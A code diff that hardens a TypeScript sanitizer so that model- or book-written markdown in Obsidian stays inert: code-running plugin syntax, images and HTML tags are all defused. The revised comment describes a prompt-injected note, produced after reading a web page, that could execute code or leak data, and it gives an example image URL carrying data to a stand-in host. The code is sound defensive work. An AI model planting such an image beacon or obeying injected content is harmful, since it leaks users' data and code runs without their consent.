@@ -180,8 +180,13 @@ export function sanitizeName(raw: string, max = 100): string | null {
 }
 
 /**
- * Makes model-written markdown inert in Obsidian plugins that run code: Dataview JS, JS Engine
- * and Templater. @research reads web pages, so a prompt-injected note must not execute on open.
+ * Makes markdown that came from a model or a book inert in Obsidian. Code-running plugins (Dataview
+ * JS, JS Engine, Templater) get plain text instead of code, and nothing loads or runs when the note is
+ * opened: every image becomes a link (an `![[embed]]` of a vault file stays), and every HTML tag is
+ * shown as text (`&lt;` looks the same). @research reads web pages, so a prompt-injected note must
+ * neither execute nor send what it contains to a server, the way `![](https://host/?d=...)` would the
+ * moment the note is viewed. Spotting only the remote or dangerous forms loses to encodings, nested
+ * brackets and reference definitions, so nothing of either kind is kept.
  */
 export function neutralize(md: string): string {
   return md
@@ -191,7 +196,8 @@ export function neutralize(md: string): string {
     )
     .replace(/`\$=/g, "`\\$=")
     .replace(/<%/g, "<\\%")
-    .replace(/<(\/?)(script|iframe|object|embed)\b/gi, "&lt;$1$2");
+    .replace(/!(?=\[(?!\[))/g, "") // an image of any form -> a link; ![[embeds]] stay
+    .replace(/<(?=\/?[a-z][a-z0-9-]*(?:[\s/>]|$))/gim, "&lt;"); // an HTML tag -> text; <https://...> autolinks stay
 }
 
 const HEADING = /^#{1,6}[ \t]+/;
